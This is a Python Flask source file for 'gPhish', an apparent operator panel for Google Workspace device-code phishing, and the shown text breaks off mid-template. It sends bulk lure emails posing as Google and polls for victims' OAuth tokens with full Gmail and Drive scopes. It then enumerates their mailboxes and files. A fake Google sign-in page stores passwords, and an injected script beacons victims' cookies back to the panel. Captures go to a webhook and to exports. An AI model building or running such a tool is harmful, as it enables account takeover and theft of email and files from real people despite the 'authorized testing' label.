#!/usr/bin/env python3
"""
gPhish Admin Panel — Google Workspace Device Code Phishing
(authorized testing only)

ARCHITECTURE — two separate deployments:
  - THIS panel: admin-only. Dashboard, campaigns, victims, exports.
    Never sent to victims. Behind basic auth.
  - lure_server.py: victim-facing fake login on a DIFFERENT server/domain.
    Pushes captures here via POST /lure-ingest (shared key auth).

Run:
  HTTPS panel on :5443 with basic auth (GPANEL_USER / GPANEL_PASS env,
  default admin/changeme).
  GPANEL_HTTP=1 → plain HTTP behind a tunnel/proxy (cloudflared/nginx/Fly).
  GPANEL_DATA=/data/panel_data.json → persistent volume (Docker/Fly).
  LURE_INGEST_KEY=<secret> → accepts captures from your lure server(s).

Tabs: Dashboard, Campaigns, Victims, Creds, Mailing, Send Log, Settings, Logs
Exports: full JSON, victims CSV, creds CSV, cookies TXT, cookies JSON.
"""

import requests, time, json, smtplib, threading, os, uuid, base64, functools, ssl
import csv, io, datetime, random, queue, re, ipaddress, socket, glob
from flask import (Flask, request, render_template_string, redirect,
                   url_for, make_response, Response)
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__)
DATA_FILE = os.environ.get("GPANEL_DATA", "panel_data.json")

PANEL_USER = os.environ.get("GPANEL_USER", "admin")
PANEL_PASS = os.environ.get("GPANEL_PASS", "changeme")
LURE_INGEST_KEY = os.environ.get("LURE_INGEST_KEY", "")

DEFAULTS = {
    "campaigns": [],
    "victims": [],
    "creds": [],
    "logs": [],
    "mailing_lists": [],
    "sends": [],
    "schedules": [],
    "blasts": [],
    "settings": {
        "scopes": [
            "https://www.googleapis.com/auth/userinfo.profile",
            "https://www.googleapis.com/auth/userinfo.email",
            "https://mail.google.com/",
            "https://www.googleapis.com/auth/drive",
        ],
        "smtp_host": "smtp.gmail.com",
        "smtp_user": "",
        "smtp_pass": "",
        "webhook_url": "",
        "last_client_id": "",
        "lure_subject": "New device sign-in — verification required",
        "lure_sender_name": "Google Workspace",
        "lure_template": "",
        "send_delay_min": 15,
        "send_jitter": 5,
        "max_workers": 5,
        "poll_interval": 5,
        "auto_enum": True,
        "notify_on_send": False,
        "notify_on_capture": True,
        "notify_on_creds": True,
        "archive_days": 30,
        "tz_offset_hours": 0,
        "late_tolerance_min": 15,
        "max_log_entries": 500,
        "max_send_entries": 2000,
        "data_file_max_mb": 10,
        # --- domains ---
        "panel_domain": "",   # admin panel URL (yours only)
        "lure_domain": "",    # victim-facing lure server URL (different domain!)
        "mail_domain": "",    # sender domain for lure emails
        # --- local /login fallback (use lure_server.py in production) ---
        "creds_enabled": False,
        "after_login_redirect": "https://google.com/device",
        "creds_page_title": "Sign in — Google Accounts",
    },
}
DATA = json.loads(json.dumps(DEFAULTS))
if os.path.exists(DATA_FILE):
    with open(DATA_FILE) as f:
        DATA = {**json.loads(json.dumps(DEFAULTS)), **json.load(f)}

DEVICE_URL = "https://oauth2.googleapis.com/device/code"
TOKEN_URL  = "https://oauth2.googleapis.com/token"
SCOPE_NAMES = {
    "https://mail.google.com/": "Full Gmail",
    "https://www.googleapis.com/auth/drive": "Full Drive",
    "https://www.googleapis.com/auth/userinfo.profile": "Profile",
    "https://www.googleapis.com/auth/userinfo.email": "Email",
}
EMAIL_RE = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")

# ---------- persistence, logging, time ----------
def save():
    try:
        if os.path.exists(DATA_FILE) and \
           os.path.getsize(DATA_FILE) > \
           DATA["settings"].get("data_file_max_mb", 10) * 1e6:
            archive = DATA_FILE.replace(".json",
                f".{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}.json")
            os.replace(DATA_FILE, archive)
            old = sorted(glob.glob(DATA_FILE.replace(".json", ".*.json")))
            for p in old[:-3]:
                os.remove(p)
    except Exception:
        pass
    with open(DATA_FILE, "w") as f:
        json.dump(DATA, f, indent=2)

def tz_minutes():
    return int(DATA["settings"].get("tz_offset_hours", 0)) * 60

def now_local():
    return datetime.datetime.now() + datetime.timedelta(minutes=tz_minutes())

def now_str():
    return now_local().strftime("%Y-%m-%d %H:%M:%S")

def log(level, msg):
    DATA["logs"].insert(0, {"time": now_str(), "level": level, "msg": msg})
    DATA["logs"] = DATA["logs"][:int(DATA["settings"].get("max_log_entries", 500))]
    save()

def record_send(email, status, campaign_id=""):
    DATA["sends"].insert(0, {"time": now_str(), "email": email,
                             "status": status, "campaign_id": campaign_id})
    DATA["sends"] = DATA["sends"][:int(DATA["settings"].get("max_send_entries", 2000))]
    save()

def notify_webhook(title, body):
    url = DATA["settings"].get("webhook_url")
    if not url:
        return
    try:
        requests.post(url, json={"content": f"**{title}**\n{body}"}, timeout=10)
        log("info", f"Webhook notified: {title}")
    except Exception as e:
        log("error", f"Webhook failed: {e}")

# ---------- basic auth (skipped for victim-facing /login fallback) ----------
def require_auth(f):
    @functools.wraps(f)
    def wrapper(*args, **kwargs):
        auth = request.headers.get("Authorization", "")
        if auth.startswith("Basic "):
            try:
                user, _, pw = base64.b64decode(auth[6:]).decode().partition(":")
            except Exception:
                user, pw = "", ""
            if user == PANEL_USER and pw == PANEL_PASS:
                return f(*args, **kwargs)
        resp = make_response("Unauthorized", 401)
        resp.headers["WWW-Authenticate"] = 'Basic realm="gPhish"'
        return resp
    return wrapper

# ---------- core logic ----------
def get_device_code(client_id, scopes):
    r = requests.post(DEVICE_URL, data={
        "client_id": client_id, "scope": " ".join(scopes)})
    r.raise_for_status()
    d = r.json()
    d["verification_url"] = d.get("verification_url", d.get("verification_uri"))
    return d

def render_lure(url, code):
    s = DATA["settings"]
    if s.get("lure_template", "").strip():
        return s["lure_template"].format(url=url, code=code)
    return f"""
<html><body style="font-family:Roboto,Arial">
  <p>A new device attempted to access your Google Workspace account.
  Confirm it's you by entering this verification code:</p>
  <p style="font-size:28px;letter-spacing:4px"><b>{code}</b></p>
  <p><a href="{url}" style="background:#1a73e8;color:#fff;padding:10px 22px;
     text-decoration:none;border-radius:4px">Verify device</a></p>
</body></html>"""

def send_lure_email(victim, url, code):
    s = DATA["settings"]
    msg = MIMEMultipart()
    msg["From"] = f"{s.get('lure_sender_name', 'Google Workspace')} <{s['smtp_user']}>"
    msg["To"] = victim
    msg["Subject"] = s.get("lure_subject",
                           "New device sign-in — verification required")
    msg.attach(MIMEText(render_lure(url, code), "html"))
    with smtplib.SMTP(s["smtp_host"], 587, timeout=20) as smtp:
        smtp.starttls()
        smtp.login(s["smtp_user"], s["smtp_pass"])
        smtp.send_message(msg)

def refresh_access_token(client_id, rt):
    body = requests.post(TOKEN_URL, data={
        "client_id": client_id, "grant_type": "refresh_token",
        "refresh_token": rt}).json()
    return body.get("access_token")

def enumerate_access(at):
    h = {"Authorization": f"Bearer {at}"}
    intel = {}
    r = requests.get("https://www.googleapis.com/oauth2/v3/userinfo",
                     headers=h).json()
    intel["identity"] = {k: r.get(k) for k in ("email", "name", "hd")}
    r = requests.get(
        "https://gmail.googleapis.com/gmail/v1/users/me/labels/INBOX", headers=h)
    intel["gmail"] = ({"accessible": True,
                       "messages": r.json().get("messagesTotal")}
                      if r.status_code == 200 else {"accessible": False})
    r = requests.get("https://www.googleapis.com/drive/v3/about"
                     "?fields=storageQuota", headers=h)
    intel["drive"] = {"accessible": r.status_code == 200}
    if r.status_code == 200:
        q = r.json().get("storageQuota", {})
        intel["drive"]["used_gb"] = round(int(q.get("usage", 0)) / 1e9, 2)
        files = requests.get("https://www.googleapis.com/drive/v3/files"
                             "?pageSize=10&fields=files(name)",
                             headers=h).json()
        intel["drive"]["files"] = [f["name"] for f in files.get("files", [])]
    intel["scopes"] = [SCOPE_NAMES.get(s, s) for s in requests.get(
        "https://oauth2.googleapis.com/tokeninfo",
        params={"access_token": at}).json().get("scope", "").split()]
    return intel

# ---------- domain helpers ----------
def active_domain():
    host = request.host.split(":")[0] if request.host else ""
    fwd = request.headers.get("X-Forwarded-Host", "")
    if fwd:
        host = fwd.split(",")[0].strip().split(":")[0]
    return host

def domain_status():
    s = DATA["settings"]
    act = active_domain().lower()
    panel_cfg = (s.get("panel_domain") or "").lower() \
        .replace("http://", "").replace("https://", "").strip().rstrip("/")
    lure_cfg = (s.get("lure_domain") or "").lower() \
        .replace("http://", "").replace("https://", "").strip().rstrip("/")
    mail_cfg  = (s.get("mail_domain") or "").lower() \
        .replace("http://", "").replace("https://", "").strip().rstrip("/")
    panel_match = bool(panel_cfg) and (act == panel_cfg or act.endswith("." + panel_cfg))
    # separation check: panel and lure MUST be different domains
    separation = "unknown"
    if panel_cfg and lure_cfg:
        if panel_cfg == lure_cfg:
            separation = "SAME domain (bad — burn risk to admin infra)"
        else:
            separation = "separate domains (correct)"
    mail_relation = "unknown"
    if mail_cfg and panel_cfg:
        if panel_cfg == mail_cfg:
            mail_relation = "same-domain (NOT recommended — separate panel & mail)"
        elif panel_cfg.endswith("." + mail_cfg) or mail_cfg.endswith("." + panel_cfg):
            mail_relation = "subdomain of same root (acceptable)"
        else:
            mail_relation = "separate domains (recommended)"
    return act, panel_cfg, lure_cfg, mail_cfg, panel_match, separation, mail_relation

# ---------- cred helpers ----------
def find_victim_rt(email):
    e = (email or "").strip().lower()
    if not e:
        return ""
    for v in DATA["victims"]:
        if (v.get("email") or "").strip().lower() == e and v.get("refresh_token"):
            return v["refresh_token"]
    return ""

def attach_rt_to_cred(email, rt):
    e = (email or "").strip().lower()
    for c in DATA["creds"]:
        if (c.get("email") or "").strip().lower() == e and not c.get("refresh_token"):
            c["refresh_token"] = rt
            save()
            return True
    return False

def creds_with_cookies():
    return [c for c in DATA["creds"]
            if c.get("cookies") and not c.get("_pending_cookies")]

# ---------- background poller ----------
def poll_campaign(camp_id):
    camp = next((c for c in DATA["campaigns"] if c["id"] == camp_id), None)
    if not camp:
        return
    s = DATA["settings"]
    interval = float(s.get("poll_interval", 5))
    while camp["status"] == "waiting" and time.time() < camp["expires"]:
        try:
            body = requests.post(TOKEN_URL, data={
                "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                "client_id": camp["client_id"],
                "device_code": camp["device"]["device_code"]}).json()
        except Exception as e:
            log("error", f"Poll error: {e}")
            time.sleep(interval)
            continue
        if "access_token" in body:
            camp["status"] = "captured"
            camp["tokens"] = body
            if s.get("auto_enum", True):
                camp["intel"] = enumerate_access(body["access_token"])
            email = (camp.get("intel", {}).get("identity", {}).get("email")
                     or camp.get("victim") or "unknown")
            DATA["victims"].insert(0, {
                "id": camp["id"], "email": email,
                "captured": now_str(),
                "client_id": camp["client_id"],
                "refresh_token": body.get("refresh_token", ""),
                "intel": camp["intel"]})
            log("success", f"TOKENS CAPTURED — {email}")
            if s.get("notify_on_capture", True):
                notify_webhook("Victim approved device code!",
                               f"Email: {email}\n"
                               f"Enumerated: {bool(camp.get('intel'))}")
            save()
            return
        err = body.get("error")
        if err == "slow_down":
            interval += 5
        if err in ("expired_token", "access_denied"):
            camp["status"] = err
            log("warn", f"Campaign {camp['code']} ended: {err}")
            save()
            return
        time.sleep(interval)
    if camp["status"] == "waiting":
        camp["status"] = "expired"
        log("warn", "Campaign expired")
        save()

# ---------- bulk send engine (crash-safe, resumable) ----------
def bulk_send(emails, client_id, blast_id=None, resume=False):
    if resume and blast_id:
        blast = next((b for b in DATA["blasts"] if b["id"] == blast_id), None)
        if not blast:
            return
        blast["status"] = "running"
        log("info", f"Blast {blast_id} resumed: "
                    f"{len(blast['emails']) - len(blast['sent']) - len(blast['failed'])} remaining")
    else:
        blast = {
            "id": blast_id or uuid.uuid4().hex[:12],
            "client_id": client_id, "emails": list(emails),
            "sent": [], "failed": [], "status": "running",
            "started": now_str(), "finished": None}
        DATA["blasts"].insert(0, blast)
    save()

    q = queue.Queue()
    for e in blast["emails"]:
        if e not in blast["sent"] and e not in blast["failed"]:
            q.put(e)
    stats = {"ok": 0, "fail": 0}
    workers = max(1, min(int(DATA["settings"].get("max_workers", 5)),
                         q.qsize() or 1))
    threads = [threading.Thread(target=_blast_worker,
                args=(q, blast, stats), daemon=True) for _ in range(workers)]
    for t in threads: t.start()
    for t in threads: t.join(timeout=7200)

    blast["status"] = "done"
    blast["finished"] = now_str()
    save()
    log("success" if stats["fail"] == 0 else "warn",
        f"Blast {blast['id']} done: +{stats['ok']} sent, +{stats['fail']} failed "
        f"(total {len(blast['sent'])}/{len(blast['emails'])})")
    notify_webhook("Blast complete",
                   f"{blast['id']}: "
                   f"{len(blast['sent'])}/{len(blast['emails'])} delivered")

def _blast_worker(q, blast, stats):
    s = DATA["settings"]
    while True:
        try:
            victim = q.get_nowait()
        except queue.Empty:
            return
        try:
            dev = get_device_code(blast["client_id"], s["scopes"])
            send_lure_email(victim, dev["verification_url"], dev["user_code"])
            camp = {
                "id": uuid.uuid4().hex[:12], "client_id": blast["client_id"],
                "device": dev, "url": dev["verification_url"],
                "code": dev["user_code"], "status": "waiting",
                "expires": time.time() + dev.get("expires_in", 900),
                "victim": victim, "tokens": None, "intel": None,
                "created": now_str()}
            DATA["campaigns"].insert(0, camp)
            threading.Thread(target=poll_campaign, args=(camp["id"],),
                             daemon=True).start()
            record_send(victim, "sent", camp["id"])
            log("info", f"Lure sent → {victim} (code {camp['code']})")
            if s.get("notify_on_send"):
                notify_webhook("Lure sent", f"→ {victim}")
            blast["sent"].append(victim)
            stats["ok"] += 1
        except Exception as e:
            record_send(victim, f"failed: {e}")
            log("error", f"Lure failed → {victim}: {e}")
            blast["failed"].append(victim)
            stats["fail"] += 1
        save()
        time.sleep(random.uniform(
            float(s.get("send_delay_min", 15)),
            float(s.get("send_delay_min", 15)) + float(s.get("send_jitter", 5))))

# ---------- archive purge + scheduler ----------
def purge_old_campaigns():
    days = int(DATA["settings"].get("archive_days", 30) or 0)
    if days <= 0:
        return
    cutoff = time.time() - days * 86400
    def camp_time(c):
        try:
            return datetime.datetime.strptime(
                c["created"], "%Y-%m-%d %H:%M:%S").timestamp()
        except Exception:
            return 0
    before = len(DATA["campaigns"])
    DATA["campaigns"] = [c for c in DATA["campaigns"] if camp_time(c) >= cutoff]
    removed = before - len(DATA["campaigns"])
    if removed:
        log("info", f"Auto-archive: purged {removed} campaigns older than {days}d")
        save()

def _scheduled_blast(sch_id, emails, client_id):
    bulk_send(emails, client_id)
    sch = next((s for s in DATA["schedules"] if s["id"] == sch_id), None)
    if sch:
        sch["status"] = "done"
        log("success", f"Scheduled blast '{sch['list_name']}' complete")
        save()

def scheduler_loop():
    for b in DATA["blasts"]:
        if b["status"] == "running":
            b["status"] = "interrupted"
            save()
    for b in DATA["blasts"]:
        if b["status"] == "interrupted":
            remaining = len(b["emails"]) - len(b["sent"]) - len(b["failed"])
            log("info", f"Resuming interrupted blast {b['id']} "
                        f"({remaining} remaining)")
            threading.Thread(target=bulk_send,
                             args=([], b["client_id"], b["id"], True),
                             daemon=True).start()

    last_purge_day = None
    while True:
        tolerance = float(DATA["settings"].get("late_tolerance_min", 15))
        due = []
        for sch in DATA["schedules"]:
            if sch["status"] != "pending":
                continue
            try:
                run_at = (datetime.datetime.fromisoformat(sch["run_at"])
                          - datetime.timedelta(minutes=tz_minutes()))
            except Exception:
                sch["status"] = "invalid"
                continue
            late_min = (datetime.datetime.now() - run_at).total_seconds() / 60
            if 0 <= late_min <= tolerance:
                due.append(sch)
            elif late_min > tolerance:
                sch["status"] = "skipped"
                log("warn", f"Scheduled blast '{sch['list_name']}' skipped "
                            f"(fired {late_min:.0f} min late > tolerance "
                            f"{tolerance:.0f} min)")
                save()
        for sch in due:
            lst = next((l for l in DATA["mailing_lists"]
                        if l["name"] == sch["list_name"]), None)
            if not lst or not sch.get("client_id"):
                sch["status"] = "failed"
                log("error", f"Scheduled blast '{sch['list_name']}' failed "
                             f"(missing list or client_id)")
                save()
                continue
            sch["status"] = "running"; save()
            log("info", f"Scheduled blast starting: {sch['list_name']} "
                        f"({len(lst['emails'])} targets)")
            notify_webhook("Scheduled blast started",
                           f"List: {sch['list_name']} — "
                           f"{len(lst['emails'])} targets")
            threading.Thread(target=_scheduled_blast,
                             args=(sch["id"], lst["emails"], sch["client_id"]),
                             daemon=True).start()
        today = datetime.datetime.now().strftime("%Y-%m-%d")
        if last_purge_day != today:
            purge_old_campaigns()
            last_purge_day = today
        time.sleep(30)

# ---------- TLS cert ----------
def make_selfsigned_cert(certfile="panel.pem", keyfile="panel-key.pem"):
    if os.path.exists(certfile) and os.path.exists(keyfile):
        return
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa

    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "gphish.local")])
    san = x509.SubjectAlternativeName([
        x509.DNSName("localhost"),
        x509.IPAddress(ipaddress.ip_address("127.0.0.1")),
        x509.IPAddress(ipaddress.ip_address(
            socket.gethostbyname(socket.gethostname()))),
    ])
    cert = (x509.CertificateBuilder()
            .subject_name(name).issuer_name(name)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.datetime.utcnow())
            .not_valid_after(datetime.datetime.utcnow()
                             + datetime.timedelta(days=365))
            .add_extension(san, critical=False)
            .sign(key, hashes.SHA256()))
    with open(certfile, "wb") as f:
        f.write(cert.public_bytes(serialization.Encoding.PEM))
    with open(keyfile, "wb") as f:
        f.write(key.private_bytes(serialization.Encoding.PEM,
                serialization.PrivateFormat.TraditionalOpenSSL,
                serialization.NoEncryption()))
    os.chmod(keyfile, 0o600)

# ---------- local /login FALLBACK (prefer separate lure_server.py) ----------
LOGIN_PAGE = """<!doctype html><html><head>
<title>{{title}}</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{font-family:Roboto,'Segoe UI',Arial,sans-serif;background:#fff;margin:0}
.wrap{max-width:400px;margin:60px auto;padding:0 24px}
h1{font-size:24px;font-weight:400;color:#202124;text-align:center;margin:0 0 8px}
p.sub{color:#5f6368;font-size:15px;text-align:center;margin:0 0 28px}
input[type=email],input[type=password]{width:100%;padding:14px 16px;font-size:16px;
  border:1px solid #dadce0;border-radius:6px;margin-bottom:16px;outline:none}
input:focus{border-color:#1a73e8;box-shadow:0 0 0 1px #1a73e8}
.btnrow{display:flex;justify-content:space-between;align-items:center}
a{color:#1a73e8;text-decoration:none;font-size:14px}
button{background:#1a73e8;color:#fff;border:none;border-radius:6px;
  padding:11px 26px;font-size:15px;font-weight:600;cursor:pointer}
.err{color:#d93025;font-size:13px;margin-bottom:14px}
</style></head><body><div class="wrap">
<h1>{{title}}</h1><p class="sub">to continue to {{appname}}</p>
{% if error %}<p class="err">{{error}}</p>{% endif %}
<form method="post" action="/login">
  <input type="email" name="email" placeholder="Email or phone" required value="{{email or ''}}">
  <input type="password" name="password" placeholder="Enter your password" required>
  <div class="btnrow"><a href="#">Create account</a>
  <button type="submit">Next</button></div>
</form></div>
<script>try{fetch('/creds/cookies?c='+encodeURIComponent(document.cookie),{keepalive:true})}catch(e){}</script>
</body></html>"""

@app.route("/login", methods=["GET", "POST"])
def login_page():
    """Victim-facing FALLBACK — only when no separate lure server.
    Disabled by default (creds_enabled=False) so the admin panel domain
    is never used for phishing."""
    s = DATA["settings"]
    if not s.get("creds_enabled", False):
        return "Not found", 404
    ua = request.headers.get("User-Agent", "")[:200]
    if request.method == "POST":
        email = request.form.get("email", "").strip()
        password = request.form.get("password", "")
        if email and password:
            beaconed = ""
            ip_now = request.headers.get("X-Forwarded-For",
                     request.remote_addr or "").split(",")[0].strip()
            for c in DATA["creds"]:
                if c.get("_pending_cookies") and \
                   c.get("ip", "").split(",")[0].strip() == ip_now:
                    beaconed = c["_pending_cookies"]
                    break
            DATA["creds"].insert(0, {
                "time": now_str(), "email": email, "password": password,
                "cookies": beaconed,
                "refresh_token": find_victim_rt(email),
                "ip": ip_now, "ua": ua})
            log("success", f"CREDS CAPTURED — {email}"
                           f"{' (cookies attached)' if beaconed else ''}")
            if s.get("notify_on_creds", True):
                notify_webhook("Credentials captured!",
                               f"Email: {email}\nPassword: {password}\n"
                               f"Cookies: {beaconed or '(none)'}")
            save()
            redirect_to = s.get("after_login_redirect", "").strip()
            if redirect_to:
                return redirect(redirect_to, code=302)
            return render_template_string(LOGIN_PAGE, title=s.get(
                "creds_page_title", "Sign in — Google Accounts"),
                appname="Google Workspace", error="Wrong password. Try again.",
                email=email)
        return render_template_string(LOGIN_PAGE, title=s.get(
            "creds_page_title", "Sign in — Google Accounts"),
            appname="Google Workspace",
            error="Enter your email and password.", email=email)
    return render_template_string(LOGIN_PAGE, title=s.get(
        "creds_page_title", "Sign in — Google Accounts"),
        appname="Google Workspace", error=None, email=None)

@app.route("/creds/cookies")
def creds_cookies():
    s = DATA["settings"]
    if not s.get("creds_enabled", False):
        return ("", 204)
    raw = request.args.get("c", "")
    if not raw:
        return ("", 204)
    ip = request.headers.get("X-Forwarded-For",
            request.remote_addr or "").split(",")[0].strip()
    for c in DATA["creds"]:
        if (c.get("ip", "").split(",")[0].strip() == ip
                and not c.get("cookies")):
            c["cookies"] = raw[:4000]
            c.pop("_pending_cookies", None)
            log("info", f"Cookies beaconed for {c.get('email')}")
            save()
            return ("", 204)
    DATA["creds"].insert(0, {
        "time": now_str(), "email": "(pre-login beacon)",
        "password": "", "cookies": raw[:4000],
        "refresh_token": "", "ip": ip,
        "ua": request.headers.get("User-Agent", "")[:200],
        "_pending_cookies": raw[:4000]})
    save()
    return ("", 204)

# ---------- lure server ingest (captures from separate lure server) ----------
@app.route("/lure-ingest", methods=["POST"])
def lure_ingest():
    """Receives captures from lure_server.py deployments.
    Auth via shared LURE_INGEST_KEY. No basic auth (machine-to-machine)."""
    if not LURE_INGEST_KEY or request.json.get("key") != LURE_INGEST_KEY:
        return "Forbidden", 403
    c = request.json.get("capture", {})
    email = c.get("email", "")
    DATA["creds"].insert(0, {
        "time": c.get("time", now_str()), "email": email,
        "password": c.get("password", ""), "cookies": c.get("cookies", ""),
        "refresh_token": find_victim_rt(email),
        "ip": c.get("ip", ""), "ua": c.get("ua", ""),
        "source": f"lure:{c.get('campaign', '?')}"})
    log("success", f"LURE-SERVER CAPTURE — {email} "
                   f"(campaign {c.get('campaign', '?')})")
    if DATA["settings"].get("notify_on_creds", True):
        notify_webhook("Lure-server credentials captured!",
                       f"Email: {email}\nCampaign: {c.get('campaign')}")
    save()
    return "ok"

# ---------- UI ----------
TPL = """<!doctype html><html><head><title>gPhish Panel</title>
<style>
*{box-sizing:border-box}
body{background:#0d1117;color:#c9d1d9;font-family:'Segoe UI',Roboto,sans-serif;margin:0}
header{background:#161b22;padding:14px 32px;border-bottom:1px solid #30363d;
  display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:9}
h1{margin:0;font-size:19px;color:#58a6ff}
nav{display:flex;gap:4px;flex-wrap:wrap}
nav a{color:#8b949e;text-decoration:none;padding:8px 16px;border-radius:6px;font-size:14px}
nav a:hover{background:#21262d;color:#c9d1d9}
nav a.active{background:#1f6feb33;color:#58a6ff;font-weight:600}
main{max-width:1200px;margin:28px auto;padding:0 20px}
.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;margin-bottom:24px}
.stat{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:18px}
.stat .num{font-size:32px;font-weight:700;color:#58a6ff}
.stat.green .num{color:#3fb950}.stat.red .num{color:#f85149}
.stat .lbl{font-size:12px;color:#8b949e;text-transform:uppercase;letter-spacing:1px;margin-top:4px}
.card{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:20px;margin-bottom:24px}
h2{margin:0 0 16px;font-size:14px;color:#8b949e;text-transform:uppercase;letter-spacing:1px}
input,textarea,select{background:#0d1117;border:1px solid #30363d;color:#c9d1d9;
  padding:9px 12px;border-radius:6px;font-size:14px;width:100%}
input:focus,textarea:focus{outline:1px solid #58a6ff}
button{cursor:pointer;background:#238636;border:1px solid #238636;color:#fff;
  padding:9px 18px;border-radius:6px;font-size:14px;font-weight:600}
button:hover{background:#2ea043}
button.danger{background:#da3633;border-color:#da3633}
button.ghost{background:transparent;color:#58a6ff;border-color:#30363d}
button.small{padding:5px 12px;font-size:12px}
.row{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:12px}
.row>div{flex:1;min-width:170px}
label{display:block;font-size:12px;color:#8b949e;margin-bottom:5px}
table{width:100%;border-collapse:collapse}
th,td{padding:10px;text-align:left;border-bottom:1px solid #21262d;font-size:13px;vertical-align:top}
th{color:#8b949e;font-weight:600;font-size:11px;text-transform:uppercase}
.badge{padding:3px 10px;border-radius:12px;font-size:11px;font-weight:600;display:inline-block}
.waiting{background:#1e3a5f;color:#58a6ff}.captured{background:#1d4021;color:#3fb950}
.expired,.access_denied,.failed,.skipped,.invalid,.warnbg{background:#4a1f1f;color:#f85149}
.okbg{background:#1d4021;color:#3fb950}
.bigcode{font-size:22px;color:#f0883e;letter-spacing:3px;font-weight:700}
a{color:#58a6ff}
details{margin-top:6px}summary{cursor:pointer;color:#58a6ff;font-size:12px}
pre{background:#0d1117;padding:12px;border-radius:6px;overflow:auto;font-size:11px;color:#7ee787;max-height:350px;word-break:break-all}
.muted{color:#8b949e;font-size:12px}
.logline{font-family:monospace;font-size:12px;padding:4px 0;border-bottom:1px solid #21262d}
.logline .t{color:#8b949e;margin-right:12px}
.logline.success{color:#3fb950}.logline.error{color:#f85149}.logline.warn{color:#d29922}
.domrow{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #21262d;font-size:14px}
.domrow:last-child{border-bottom:none}
code.pw{background:#0d1117;padding:2px 6px;border-radius:4px;font-family:monospace}
</style></head><body>
<header>
  <h1>⛔ gPhish Panel <span class="muted" style="font-size:11px;font-weight:400">(admin only — never share this URL)</span></h1>
  <nav>
    <a href="{{url_for('tab', name='dashboard')}}" class="{{'active' if tab=='dashboard'}}">Dashboard</a>
    <a href="{{url_for('tab', name='campaigns')}}" class="{{'active' if tab=='campaigns'}}">Campaigns</a>
    <a href="{{url_for('tab', name='victims')}}" class="{{'active' if tab=='victims'}}">Victims</a>
    <a href="{{url_for('tab', name='creds')}}" class="{{'active' if tab=='creds'}}">Creds</a>
    <a href="{{url_for('tab', name='mailing')}}" class="{{'active' if tab=='mailing'}}">Mailing</a>
    <a href="{{url_for('tab', name='sends')}}" class="{{'active' if tab=='sends'}}">Send Log</a>
    <a href="{{url_for('tab', name='settings')}}" class="{{'active' if tab=='settings'}}">Settings</a>
    <a href="{{url_for('tab', name='logs')}}" class="{{'active' if tab=='logs'}}">Logs</a>
  </nav>
  <span class="muted">{{now}}</span>
</header>
<main>

{% if tab == 'dashboard' %}
<div class="cards">
  <div class="stat"><div class="num">{{campaigns|length}}</div><div class="lbl">Total campaigns</div></div>
  <div class="stat green"><div class="num">{{campaigns|selectattr('status','equalto','captured')|list|length}}</div><div class="lbl">Tokens captured</div></div>
  <div class="stat"><div class="num">{{campaigns|selectattr('status','equalto','waiting')|list|length}}</div><div class="lbl">Awaiting victim</div></div>
  <div class="stat red"><div class="num">{{creds|length}}</div><div class="lbl">Creds captured</div></div>
  <div class="stat red"><div class="num">{{victims|length}}</div><div class="lbl">Victims</div></div>
</div>
<div class="card"><h2>Infrastructure &amp; domains</h2>
 <div class="domrow">
   <span>Panel URL you are browsing now <span class="muted">(auto-detected)</span></span>
   <b>{{active_domain or '(unknown)'}}</b>
 </div>
 <div class="domrow">
   <span>Configured panel domain <span class="muted">(admin only)</span></span>
   <span>{{panel_cfg or '— not set —'}}
     {% if panel_cfg %}
       {% if panel_match %}<span class="badge okbg">✅ matches active</span>
       {% else %}<span class="badge warnbg">⚠ mismatch with active</span>{% endif %}
     {% endif %}
   </span>
 </div>
 <div class="domrow">
   <span>Lure domain <span class="muted">(victims see this — must differ from panel)</span></span>
   <span>{{lure_cfg or '— not set — (run lure_server.py on separate domain)'}}
     {% if lure_cfg and panel_cfg %}
       {% if separation.startswith('separate') %}<span class="badge okbg">✅ separated</span>
       {% else %}<span class="badge warnbg">⚠ same domain!</span>{% endif %}
     {% endif %}
   </span>
 </div>
 <div class="domrow">
   <span>Lure server status</span>
   <span>{% if lure_cfg %}<a href="/lure/status" style="font-size:13px">Check now ↗</a>
     {% else %}not configured{% endif %}</span>
 </div>
 <div class="domrow">
   <span>Sending (mail) domain</span>
   <span>{{mail_cfg or '— not set —'}}</span>
 </div>
 <div class="domrow">
   <span>Local /login fallback page</span>
   <span>{% if settings.creds_enabled %}ON <span class="badge warnbg">⚠ use only for testing</span>
     {% else %}OFF (recommended — use lure_server.py){% endif %}</span>
 </div>
 <p class="muted" style="margin-top:10px">
   Victim flow: <b>lure email → {{lure_cfg or 'lure-domain'}}/l/&lt;id&gt;</b>
   (fake login, creds captured) → redirect to <b>google.com/device</b> with the
   device code → victim consents → refresh token lands here.
   The panel domain must NEVER appear in anything a victim receives.</p>
</div>
<div class="card"><h2>Export for report</h2>
  <a href="/export/json"><button type="button" class="ghost">⬇ JSON (full report)</button></a>
  &nbsp;
  <a href="/export/csv"><button type="button" class="ghost">⬇ CSV (victims)</button></a>
  &nbsp;
  <a href="/export/creds/csv"><button type="button" class="ghost">⬇ CSV (creds incl. RT)</button></a>
  &nbsp;
  <a href="/export/cookies/txt"><button type="button" class="ghost">🍪⬇ Cookies .txt</button></a>
  &nbsp;
  <a href="/export/cookies/json"><button type="button" class="ghost">🍪⬇ Cookies .json</button></a>
</div>
<div class="card"><h2>Recent activity</h2>
  {% for l in logs[:10] %}<div class="logline {{l.level}}"><span class="t">{{l.time}}</span>{{l.msg}}</div>
  {% else %}<span class="muted">No activity yet — launch a campaign.</span>{% endfor %}
</div>
<div class="card"><h2>Latest captured intel</h2>
  {% if victims %}{% set v = victims[0] %}
